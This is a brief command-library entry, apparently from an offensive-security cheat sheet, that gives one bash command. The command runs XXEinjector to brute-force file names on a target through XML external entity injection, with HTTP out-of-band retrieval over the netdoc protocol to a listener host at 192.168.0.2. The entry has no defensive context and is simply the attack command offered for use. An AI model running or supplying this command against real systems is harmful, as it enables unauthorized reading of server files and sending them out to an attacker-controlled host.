---
id: b3fe88e6-325e-4089-bf41-2a27505764cd
name: Bruteforcing files using HTTP out of band method and netdoc protocol
type: command
executor: bash
data: ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt
  --oob=http --netdoc
output: null
created_at: '2023-04-06T03:56:43.973482+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
---

# Bruteforcing files using HTTP out of band method and netdoc protocol

```bash
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
```


